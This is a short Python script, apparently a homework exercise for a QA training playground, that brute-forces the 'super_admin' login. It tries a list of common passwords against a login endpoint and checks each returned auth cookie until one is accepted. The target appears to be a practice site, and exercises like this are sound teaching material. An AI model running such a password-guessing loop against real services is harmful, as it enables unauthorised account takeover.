import requests

pas = ["123456", "123456789", "qwerty", "password", "12345678", "1234567", "123123", "12345", "1234567890", "iloveyou", "qwerty123", "000000", "1q2w3e",
       "аа12345678", "abc123", "admin", "1234", "qwertyuiop", "123321", "654321", "welcome", "111111", "qwerty123", "1q2w3e4r", "555555",
       "lovely", "7777777", "888888", "princess", "dragon", "password1", "123qwe"]

for password in pas:
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": password})
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}
    response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
    if response2.text == "You are NOT authorized":
        print("Пароль неверный")
    elif response2.text != "You are NOT authorized":
        print(f"Правильный пароль: {password}")
        print(f"Текст ответа: {response2.text}")
        break
